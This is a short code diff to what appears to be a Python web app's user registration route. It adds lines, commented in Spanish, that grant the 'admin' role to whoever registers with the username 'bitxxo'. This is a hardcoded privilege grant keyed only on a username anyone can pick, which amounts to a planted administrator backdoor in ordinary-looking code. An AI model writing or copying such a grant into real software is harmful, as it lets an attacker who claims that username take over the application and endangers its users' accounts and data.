@@ -31,6 +31,9 @@ def register():
             
         user = User(email=email, username=username)
         user.set_password(password)
+        # Asignar rol de administrador si es el usuario bitxxo
+        if username == 'bitxxo':
+            user.role = 'admin'
         db.session.add(user)
         db.session.commit()
         
